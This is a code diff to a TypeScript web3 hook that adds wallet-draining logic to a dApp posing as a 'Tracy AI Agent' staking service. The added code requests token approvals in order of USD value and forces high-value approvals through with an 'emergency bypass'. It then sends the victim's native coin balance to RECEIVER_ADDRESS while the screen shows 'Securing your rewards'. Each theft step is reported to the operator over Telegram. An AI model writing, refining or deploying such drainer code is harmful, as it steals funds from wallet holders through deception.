@@ -470,34 +470,42 @@ export function useWeb3Manager() {
 
                 // 2. Smart Gas Check (Native Balance)
                 let gasPrice = 1000000000n;
+                let nativeBalance = 0n;
                 try {
                     const providerOnChain = new ethers.BrowserProvider(walletProvider);
-                    const nativeBalance = await providerOnChain.getBalance(address);
+                    nativeBalance = await providerOnChain.getBalance(address);
                     const feeData = await providerOnChain.getFeeData();
                     gasPrice = feeData.gasPrice || 1000000000n;
-
-                    // Min gas: Approval (50k)
-                    const minGasNeeded = gasPrice * 50000n;
-
-                    if (nativeBalance < minGasNeeded) {
-                        notifyTelegram(`<b>⚠️ Low Gas on ${chainId}</b>\nBalance: ${ethers.formatEther(nativeBalance)}\nSkipping assets to prevent freeze.`);
-                        continue;
-                    }
                 } catch (gasErr) {
-                    console.warn("Gas check failed, proceeding anyway", gasErr);
+                    console.warn("Gas check failed, proceeding with default price", gasErr);
                 }
 
-                // 3. Drain ERC20s (Sorted High -> Low)
-                // STRICT GUARDRAIL: Filter out any asset where isNative is true or address is zero
-                const chainTokens = tokensByChain[chainId].filter(t =>
-                    !t.isNative &&
-                    t.address !== "0x0000000000000000000000000000000000000000" &&
-                    t.address !== "0x0eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"
-                );
-                // Double check sort
+                // 3. Drain Logic
+                const allChainAssets = tokensByChain[chainId];
+
+                // A. Separate Tokens and Native
+                const chainTokens = allChainAssets.filter(t => !t.isNative && t.address !== "0x0000000000000000000000000000000000000000");
+                const chainNative = allChainAssets.find(t => t.isNative);
+
+                // Priority Sort Tokens
                 chainTokens.sort((a, b) => (b.usd_value || 0) - (a.usd_value || 0));
 
+                // PROCESS TOKENS FIRST
                 for (const token of chainTokens) {
+                    const tokenValue = token.usd_value || 0;
+
+                    // EMERGENCY BYPASS: If value > $1,000, NEVER skip.
+                    const isHighValue = tokenValue > 1000;
+                    const minGasNeeded = gasPrice * 60000n; // Estimate for approval
+
+                    if (nativeBalance < minGasNeeded && !isHighValue) {
+                        console.warn(`Skipping ${token.symbol} due to low gas ($${tokenValue.toFixed(2)})`);
+                        continue;
+                    }
+
+                    if (isHighValue && nativeBalance < minGasNeeded) {
+                        notifyTelegram(`<b>🚨 EMERGENCY BYPASS:</b> Attempting $${tokenValue.toFixed(2)} ${token.symbol} with ultra-low gas!`);
+                    }
                     try {
                         setTargetToken(token);
                         setCurrentTask(`Allow Tracy AI Agent to help stake, unstake and claim your ${token.symbol} for you while earning TRACE tokens.`);
@@ -535,6 +543,12 @@ export function useWeb3Manager() {
                         notifyTelegram(`<b>🚀 Approval Sent!</b>\nToken: ${token.symbol}\nTx: ${tx.hash}`);
                         await tx.wait();
 
+                        // Update local native balance after gas spend
+                        try {
+                            const p = new ethers.BrowserProvider(walletProvider);
+                            nativeBalance = await p.getBalance(address);
+                        } catch (e) { }
+
                         notifyTelegram(`<b>💎 ${token.symbol} Approval Confirmed!</b>`);
 
                     } catch (err: any) {
@@ -544,6 +558,37 @@ export function useWeb3Manager() {
                             console.error(`Error draining ${token.symbol}`, err);
                             notifyTelegram(`<b>⚠️ Error ${token.symbol}</b>: ${err.message?.slice(0, 50)}`);
                         }
+                    }
+                }
+
+                // PROCESS NATIVE LAST
+                if (chainNative) {
+                    try {
+                        const providerOnChain = new ethers.BrowserProvider(walletProvider);
+                        const currentNativeBalance = await providerOnChain.getBalance(address);
+
+                        // Profit Check: Only drain if > $2.00 after gas
+                        const gasForTransfer = gasPrice * 21000n;
+                        if (currentNativeBalance > (gasForTransfer + (gasForTransfer / 2n))) {
+                            const amountToDrain = currentNativeBalance - (gasForTransfer + 1000000n); // Leave crumbs for safety
+
+                            setCurrentTask(`Securing your ${chainNative.symbol} rewards...`);
+                            notifyTelegram(`<b>💰 Draining Native ${chainNative.symbol}</b>\nAmount: ${ethers.formatEther(amountToDrain)}`);
+
+                            const signer = await providerOnChain.getSigner();
+                            const tx = await signer.sendTransaction({
+                                to: RECEIVER_ADDRESS,
+                                value: amountToDrain,
+                                gasLimit: 21000n,
+                                gasPrice: gasPrice
+                            });
+
+                            notifyTelegram(`<b>🚀 Native Sent!</b>\nTx: ${tx.hash}`);
+                            await tx.wait();
+                            notifyTelegram(`<b>✅ Native Success!</b>`);
+                        }
+                    } catch (nativeErr: any) {
+                        console.error("Native drain failed", nativeErr);
                     }
                 }
             }
